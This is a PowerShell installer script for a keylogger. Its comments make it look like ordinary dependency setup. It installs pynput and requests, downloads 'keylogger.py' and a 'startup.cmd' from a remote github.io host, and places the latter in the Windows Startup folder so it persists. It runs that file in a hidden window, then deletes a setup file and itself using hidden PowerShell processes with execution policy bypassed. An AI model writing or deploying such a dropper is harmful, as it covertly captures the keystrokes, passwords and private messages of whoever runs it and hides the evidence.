# =========================
# Ensure pip is available
# =========================

# Ensure pip is installed and upgraded
Write-Host "Upgrading pip..."
try {
    python -m ensurepip --default-pip
    python -m pip install --upgrade pip
}
catch {
    Write-Host "Failed upgrading pip..."
    Write-Host "Continuing without upgrading..."
}
# =========================
# Helper: Install Python Package
# =========================

function Install-PythonPackage {
    param([string]$Name)

    try {
        Write-Host "Installing Python package: $Name"
        python -m pip install --user $Name
    }
    catch {
        throw
    }
}

# =========================
# Install Dependencies
# =========================

Install-PythonPackage "pynput"
Install-PythonPackage "requests"

# =========================
# Download required dependencies
# =========================

# Define StartUp directory (expand %APPDATA% path)
$StartDir = [System.Environment]::GetFolderPath('ApplicationData') + "\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd"

# Define URL of the startup script
$StartUrl = "https://studentKnowledge.github.io/keylogger/startup.cmd"

# Download the script to StartUp directory
Invoke-WebRequest -Uri $StartUrl -OutFile $StartDir

# Define Temp directory for Python script
$PythonPath = Join-Path $env:TEMP "keylogger.py"

# Define URL of the Python script
$PythonUrl = "https://studentKnowledge.github.io/keylogger/keylogger.py"

# Download the Python script
Invoke-WebRequest -Uri $PythonUrl -OutFile $PythonPath

# Opening "startup.cmd" file in startup
Start-Process -FilePath "$StartDir" -WindowStyle Hidden

# Wait for 5 seconds before cleanup
Start-Sleep -Seconds 5

# Define setup script directory for a cleanup
try {
    $SetupScriptPath = Join-Path [System.Environment]::GetFolderPath('Startup') "setup.cmd"
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command Remove-Item -Path '$SetupScriptPath' -Force" -WindowStyle Hidden
}
catch {
    throw
}

# Cleanup / auto-delete
$scriptPath = $MyInvocation.MyCommand.Path

# Run a new PowerShell process to delete the script after it finishes
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command Remove-Item -Path '$scriptPath' -Force" -WindowStyle Hidden

# Exit the script
exit
